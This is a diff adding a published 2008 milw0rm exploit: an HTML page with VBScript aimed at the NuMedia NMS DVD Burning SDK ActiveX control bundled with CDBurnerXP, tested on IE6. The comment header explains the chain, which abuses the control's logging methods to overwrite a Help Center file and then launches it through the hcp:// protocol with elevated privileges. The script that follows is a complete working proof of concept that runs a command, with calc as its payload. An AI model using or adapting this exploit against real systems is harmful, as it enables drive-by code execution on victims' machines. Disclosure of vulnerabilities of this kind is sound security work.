@@ -1,0 +1,67 @@
+<!--
+5.06 19/09/2008 -----------------------------------------------------------
+
+-- NuMedia Soft NMS DVD Burning SDK Activex (NMSDVDX.dll) remote exploit --
+by Nine:Situations:Group::bruiser
+
+software site: http://www.nugroovz.com/
+our site: http://retrogod.altervista.org/
+
+affected software: CDBurnerXP 4.2.1.976, ??
+tested against IE6
+
+settings:
+RegKey Safe for Script: False
+RegKey Safe for Init: False
+Implements IObjectSafety: True
+IDisp Safe:  Safe for untrusted: caller,data  
+IPersist Safe:  Safe for untrusted: caller,data  
+
+mitigation: an "unlicensed software" box appears
+however, if the user close it or click "OK", the code will run normally
+
+explaination: "EnableLog" method can be used to overwrite a specified file,
+"LogMessage" one to write new lines on it. 
+Trough the Help and Support Center and the pluggable "hcp://" protocol you 
+can launch your file. Important to note: the Help Center will host the page 
+with elevated privileges, allowing the page to script arbitrary controls 
+with no prompts presented to the user.
+This was suggested by rgod (see hj forum) as a way to immediately execute
+the shell
+---------------------------------------------------------------------------
+
+-->
+<html>
+<title> :( </title>
+<object classid='clsid:C2FBBB5F-6FF7-4F6B-93A3-7EDB509AA938' id='DVDEngineX' />
+</object>
+
+<script language='vbscript'>
+    
+    DVDEngineX.Initialize True
+    
+    sLogFileName="C:\\WINDOWS\\PCHEALTH\\HELPCTR\\System\\sysinfo\\msinfo.htm"
+    bCreateNew=True
+    DVDEngineX.EnableLog sLogFileName ,bCreateNew 
+    
+    nl=unescape("%0d%0a")
+    'my garbage ...
+    sMsg="<HTML>" & _
+         "<SCRIPT LANGUAGE=VBScript>" & nl & _
+         "Dim WshShell, oExec" & nl & _
+         "Set WshShell = CreateObject(""WScript.Shell"")" & nl & _
+         "Set oExec = WshShell.Exec(""calc"")" & nl & _ 
+         "Do While oExec.Status = 0" & nl & _
+         "WScript.Sleep 100" & nl & _
+         "Loop" & nl & _
+         "WScript.Echo oExec.Status" & nl & _
+         "<" & Chr(47) & "SCRIPT>" & nl & _
+         "<" & Chr(47) & "HTML>" 
+    DVDEngineX.LogMessage sMsg 
+    
+    window.location = "hcp://system/sysinfo/msinfo.htm"
+
+</script>
+</html>
+
+# milw0rm.com [2008-09-19]
